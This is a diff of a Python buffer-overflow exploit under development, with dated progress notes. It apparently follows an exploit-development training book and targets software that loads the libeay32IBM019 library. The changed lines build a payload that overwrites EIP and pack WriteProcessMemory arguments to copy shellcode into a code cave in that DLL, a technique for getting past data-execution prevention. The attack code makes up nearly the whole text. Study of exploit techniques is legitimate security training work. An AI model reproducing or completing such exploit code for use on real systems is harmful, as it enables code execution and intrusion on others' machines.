@@ -210,6 +210,8 @@ recover knowledge
 - Ran the script, got 0x42424242 on EIP, unsure what part of the 42 chain is on EIP
 - rest for tomorrow
 
+1303-03082026:
+- First 0x42424242 reveals stack is misaligned, check it when back
 =============================================================================
 
 """
@@ -504,20 +506,21 @@ def main():
         buf += pack("<i", 0x100)  # 2nd memcpy: size field
         buf += pack("<i", 0x0)  # 3rd memcpy: offset
         buf += pack("<i", 0x100)  # 3rd memcpy: size field
-        buf += bytearray([0x41] * 0x8)
+        buf += bytearray([0x41] * 0x8)   # <-- Trouble area maybe, adjusted from 0x10
 
         # psCommandBuffer
         # NOTE:: My code cave is larger than the book's 0x400
         #        which is why the offset is lower than 0x92c04
         #        (0x880B0)
+        codeCaveOffset = 0x880B0
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
-        wpm += pack("<L", (libeay32ibm019 + 0x92C04))  # Shellcode Return Address
+        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
-        wpm += pack("<L", (libeay32ibm019 + 0x92C04))  # Code cave address
+        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
-        wpm += pack("<L", (0x42424242))  # dummy nSize
+        wpm += pack("<L", (0xcccccccc))  # dummy nSize
         wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
-        wpm += b"A" * 0x10
+        wpm += b"A" * 0xe
 
         offset = b"A" * (276 - len(wpm))
         # 1803_1011 (IGNORE, fixed):
